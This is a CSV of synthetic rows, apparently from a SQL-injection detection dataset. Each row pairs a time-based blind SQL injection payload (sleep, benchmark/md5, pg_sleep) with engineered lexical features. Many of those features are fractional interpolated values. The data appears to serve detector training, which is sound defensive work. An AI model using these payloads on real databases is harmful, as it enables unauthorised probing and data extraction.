id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000001,attack,time,"1 where 1842  =  1842 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000206,0.6492590758694373,87.2968124454052,25.296812445405187,3.747976898165668,22.0,27.0,30.0,8.29681244540519,0.2520206538925138,0.3092980752317215,0.34366452803524616,0.09501674284051853,0.2968124454051889,0.0,0.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,2.0,0.2968124454051889,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000002,attack,time,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",nearest_attack_euclidean,R000292,0.924367126753924,58.86678556184361,23.06660721907819,3.5150631957910776,18.0,10.0,23.866785561843617,7.0,0.3064321525722124,0.17024008476234023,0.4041597033318091,0.11916805933363817,0.0,0.6888690730260638,2.0,0.0,0.0,1.0,0.0,3.311130926973936,0.0,0.0,0.0,3.0,0.0,0.6888690730260638,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000003,attack,time,"1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'ogpg'  =  'ogpg",nearest_attack_euclidean,R000155,0.5419452578175097,96.51096894351797,20.0,2.9674401316479964,21.021937887035932,10.97806211296407,50.0,14.510968943517966,0.21747995325186675,0.1141516833524371,0.5181744321942248,0.15019393120147137,3.510968943517965,0.0,0.0,0.0,0.0,2.0,0.0,8.0,0.0,0.0,1.0,2.0,0.8777422358794913,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000004,attack,time,"1""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""zxks""  =  ""zxks",nearest_attack_euclidean,R000234,0.7748367852799806,87.40154006795146,21.0,3.1844249819471346,22.0,10.0,41.77274862967268,13.62879143827878,0.2530326814687701,0.1150148552130773,0.47595076557951516,0.15600169773863742,0.0,4.0,0.0,0.0,0.0,2.0,0.0,6.62879143827878,0.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000005,attack,time,1'  )   and sleep  (  5  )   and   (  'xecl' like 'xecl,nearest_attack_euclidean,R000129,0.1556769799675109,55.121172273042006,17.121172273042006,3.2451071626792842,23.181758409563013,1.9394138634789968,22.060586136521003,7.939413863478997,0.4204815790258371,0.03522341880231604,0.40021258293516143,0.14408241923668538,3.939413863478996,0.0,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,0.0,2.220446049250313e-16,1.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.060586136521003864,0.0,0.0,0.0,1.939413863478996,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000006,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""kojr""  =  ""kojr",nearest_attack_euclidean,R000057,1.3579142080670628,82.06038482245754,27.67673080374292,3.7015275596754758,27.41384642994337,10.0,33.0,11.646538392514158,0.3328680640173256,0.12200795967268387,0.40262626691985676,0.14249770939013376,0.0,4.0,0.0,0.0,0.0,2.0,0.0,4.0,0.6465383925141572,0.9999999999999999,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000007,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'seyd'  =  'seyd",nearest_attack_euclidean,R000302,0.55914609007046,98.789843751527,27.579687503053997,3.716210171494949,26.0,21.789843751527,38.0,13.0,0.2631894519130384,0.2205543154883095,0.38466150664213294,0.1315947259565192,4.0,0.0,0.0,0.0,0.0,2.0,0.0,6.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,1.789843751526997,0.21015624847300277,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000008,attack,time,"1%""   )    )    rlike sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000199,1.2258788269635532,68.38763165352475,18.274226978345297,2.686211604498879,15.193815826762371,2.0,38.193815826762375,13.0,0.21940722683925198,0.02953608138534189,0.5590721627706838,0.19198452900472235,0.0,4.0,0.0,0.0,0.0,1.0,0.0,6.548453956690593,1.4515460433094067,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000009,attack,time,"1"" where 7279  =  7279 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000257,1.5883389386765492,88.0,27.550365569320377,3.8697139265967393,21.550365569320377,27.899268861359246,30.0,8.550365569320377,0.2448905178331861,0.31703714615180967,0.3409090909090909,0.09716324510591337,0.0,0.5503655693203761,0.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,2.0,0.0,0.550365569320376,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,1.0,0.0,0.449634430679624,0.5503655693203761,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000010,attack,time,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chvi"" like ""chvi",nearest_attack_euclidean,R000138,1.4228081530953984,89.45423699098068,26.0,3.3712340448948557,25.0,10.0,41.711864159150565,12.742372831830114,0.2843728393200795,0.1137491357280318,0.4598570043596289,0.14202102059225977,0.0,4.0,0.0,0.0,0.0,1.0,0.0,6.742372831830113,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
